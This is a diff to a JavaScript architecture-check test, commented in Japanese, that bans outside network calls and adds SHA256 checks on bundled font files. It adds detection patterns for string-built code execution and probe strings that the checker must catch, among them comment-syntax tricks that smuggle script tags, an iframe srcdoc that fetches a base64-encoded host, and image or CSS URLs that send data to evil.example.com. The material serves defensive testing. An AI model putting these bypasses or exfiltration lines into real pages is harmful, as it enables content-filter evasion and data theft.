@@ -11,7 +11,8 @@
 // 決まりを外すときは、その行に「// arch-allow: 理由」を書く。外した数を毎回出す。
 // 実行: node test/arch.check.mjs
 import { readFileSync, existsSync, readdirSync } from 'node:fs';
-import { allowTable, tableProblems, fileProblems, unusedAllows, importmapOf, importProblems } from './outside.mjs';
+import { createHash } from 'node:crypto';
+import { allowTable, tableProblems, fileProblems, fontFaceProblems, unusedAllows, importmapOf, importProblems } from './outside.mjs';
 
 const root = new URL('../', import.meta.url);
 const read = (p) => readFileSync(new URL(p, root), 'utf8');
@@ -88,7 +89,9 @@ const NET_TOOLS = [
   [/\b(?:https?|wss?|ftp):[\\/]{2}/i, '外の URL を文字で書いている', true],
   /* 文字を組み立てて名前を作る形（window['fe' + 'tch']）は、上の禁止を素通りするので、引く道具ごと禁止する */
   [/\b(?:window|globalThis|self)\s*\??\.?\s*\[/, '文字の名前で外のものを引いている'],
-  [/\beval\b|\bFunction\s*\(/, 'eval / Function']
+  [/\beval\b|\bFunction\s*\(/, 'eval / Function'],
+  [/\bset(?:Timeout|Interval)\s*\(\s*['"`]/, '文字列をコードとして動かしている'],
+  [/\.\s*constructor\s*\(|\bReflect\s*\.|\b(?:top|parent|frames|opener)\s*\??\.?\s*\[/, '文字の名前で外のものを引いている']
 ];
 const NET_BAN = { line: [[/\bfetch\b/, '外への通信 fetch (ai-reader.js 以外)'], ...NET_TOOLS], file: [] };
 const AI_READER_BAN = { line: NET_TOOLS, file: [] };
@@ -182,9 +185,24 @@ if (!htmlFiles.length) fail('検査する HTML が無い');
   if (!rule) { fail(`表「外から読む先」に ${f} の行が無い`); return; }
   const text = read(f);
   fileProblems(text, rule, f.endsWith('.html')).forEach(v => fail(`${f}: ${v}`));
+  if (f.endsWith('.html') && !rule.fonts) fontFaceProblems(text, read).forEach(v => fail(`${f}: ${v}`));
   unusedAllows(text, rule).forEach(v => fail(`${f}: 表で許しているのに使っていない: ${v}`));
 });
 Object.keys(ALLOW || {}).filter(f => !existsSync(new URL(f, root))).forEach(f => fail(`表「外から読む先」のファイルが無い: ${f}`));
+/* 字体ファイルの中身の指紋。repo が字体の出どころなので、すり替えを見えるようにする（作り直しは tools/font-sums.mjs） */
+const SUMS = new Map(read('fonts/SHA256SUMS').split(/\r?\n/).filter(Boolean).map(l => l.split(/\s+/).reverse()));
+const woff2 = readdirSync(new URL('fonts/', root)).filter(f => f.endsWith('.woff2'));
+if (!woff2.length) fail('fonts/ に字体が無い');
+woff2.forEach(f => {
+  const sum = createHash('sha256').update(readFileSync(new URL(`fonts/${f}`, root))).digest('hex');
+  if (!SUMS.has(f)) fail(`fonts/SHA256SUMS に無い字体: ${f}`);
+  else if (SUMS.get(f) !== sum) fail(`字体の中身が SHA256SUMS と違う: ${f}`);
+});
+[...SUMS.keys()].filter(f => !woff2.includes(f)).forEach(f => fail(`fonts/SHA256SUMS にあるのに無い字体: ${f}`));
+const fontUrls = [...read('css/fonts.css').matchAll(/url\(\.\.\/fonts\/([^)]+)\)/g)].map(m => m[1]);
+fontUrls.filter(f => !woff2.includes(f)).forEach(f => fail(`css/fonts.css が無い字体を読む: ${f}`));
+woff2.filter(f => !fontUrls.includes(f)).forEach(f => fail(`css/fonts.css が使っていない字体: ${f}`));
+
 const MAP = importmapOf(htmlFiles.map(read).join('\n'));
 const codeOf = (src) => stripComments(src, false).join('\n');
 jsFiles.forEach(p => importProblems(codeOf(read(p)), MAP).forEach(v => fail(`${p}: ${v}`)));
@@ -217,7 +235,7 @@ const CLEAN = ['const s = "Date of birth";', "const u = 'window.document and fet
 const before = allowed;
 PROBES.forEach(([rules, code]) => { if (!violations(code, rules).length) fail(`検査が甘い: 「${code.replace(/\n/g, ' ')}」を見逃した`); });
 /* 8 番の見本（ジンとザクのレビューで見逃した書き方）。[許可の行, 中身, HTML か] */
-const NONE = { allow: [], bare: [] };
+const NONE = { allow: [], bare: [], fonts: true };
 const IDX = (ALLOW && ALLOW['index.html']) || NONE;
 const QR = 'https://cdnjs.cloudflare.com/ajax/libs/qrcode-generator/1.4.4/';
 const TJS = 'https://cdn.jsdelivr.net/npm/three@0.160.0/';
@@ -254,6 +272,10 @@ const FILE_PROBES = [
   [IDX, '<img src="https:/\t/evil.example.com/p.png">', true],
   [IDX, "<style>.a{background:url('https:\\2f\\2f evil.example.com/p.png')}</style>", true],
   [IDX, '<img src="/\t/evil.example.com/p.png">', true],
+  [IDX, `<!--><script src="${QR}x.js"></script><!-- -->`, true],
+  [IDX, `<!-- a --!><script src="${QR}x.js"></script><!-- -->`, true],
+  [IDX, "<iframe srcdoc='&lt;script&gt;fetch(atob(\"aHR0cHM6Ly9ldmls\"))&lt;/script&gt;'></iframe>", true],
+  [NONE, '.a{background:url("/\\\n/evil.example.com/p.png")}', false],
   [NONE, '@import url("https://fonts.googleapis.com/css2?family=X");', false],
   [NONE, '.a{background:url(//evil.example.com/p.png)}', false]
 ];
@@ -267,14 +289,18 @@ const FILE_CLEAN = [
 const NET_PROBES = ['import("https://evil.example.com/x.js");', "const x = '\\\\\\\\evil.example.com/a';", "el('script', { src: u });", "new Image().src = 'https://evil.example.com/p?d=' + d;",
   'navigator.sendBeacon(u, d);', 'const f = fetch; f(u);', 'fetch\n(u);', "document.createElement('iframe');", 'const w = new Worker(u);',
   'const s = new WebSocket(u);', "const x = '//evil.example.com/a';", 'const x = "wss://evil.example.com/a";', 'importScripts(u);',
-  "window['fe' + 'tch'](u);", "Function('return 1')();"];
+  "window['fe' + 'tch'](u);", "Function('return 1')();",
+  "setTimeout('fe' + 'tch(u)', 0);", "(() => 0).constructor('return 1')();", 'Reflect.get(window, k)(u);', 'top[k](u);'];
 const NET_CLEAN = ["const s = 'a//b'; const u = '/api/read'; const p = x.split('//');", "const re = new RegExp('\\\\b(?:cold)\\\\b'); const e = s.replace(r, '\\\\$&');", "el('button', { type: 'button' });", 'const prefetch = 1;'];
 const IMPORT_PROBES = ["import { OrbitControls } from 'three/addons/controls/OrbitControls.js';", "import x from 'lodash';",
   "export * from 'https://evil.example.com/x.js';"];
 const IMPORT_CLEAN = "import * as THREE from 'three';\nimport { GLTFLoader } from 'three/addons/loaders/GLTFLoader.js';\nimport { a } from './a.js';";
 const TABLE_PROBES = [{ 'a.html': { allow: ['https://cdn.jsdelivr.net'], bare: [] } }, { 'a.html': { allow: ['https://a.example.com/x/'], bare: ['https://b.example.com/'] } },
   { 'a.html': { allow: ['http://a.example.com/'], bare: [] } }];
-const probeCount = FILE_PROBES.length + NET_PROBES.length + IMPORT_PROBES.length + TABLE_PROBES.length;
+const FONT_PROBES = ['<link rel="stylesheet" href="css/fonts.css">', '<style>@font-face { font-family: x; src: url(fonts/a.woff2); }</style>'];
+FONT_PROBES.forEach(h => { if (!fontFaceProblems(h, read).length) fail(`検査が甘い: 字体を読まないページの「${h.slice(0, 60)}」を見逃した`); });
+if (fontFaceProblems('<link rel="stylesheet" href="css/app.css">', read).length) fail('検査が厳しすぎる: @font-face の無い css/app.css を違反と見た');
+const probeCount = FILE_PROBES.length + NET_PROBES.length + IMPORT_PROBES.length + TABLE_PROBES.length + FONT_PROBES.length;
 TABLE_PROBES.forEach(t => { if (!tableProblems(t).length) fail(`検査が甘い: 表の書き方 ${JSON.stringify(t)} を見逃した`); });
 FILE_PROBES.forEach(([rule, text, isHtml]) => { if (!fileProblems(text, rule, isHtml).length) fail(`検査が甘い: 「${text.slice(0, 70)}」を見逃した`); });
 FILE_CLEAN.forEach(([rule, text, isHtml]) => { const v = fileProblems(text, rule, isHtml); if (v.length) fail(`検査が厳しすぎる: 「${text.slice(0, 50)}」→ ${v[0]}`); });
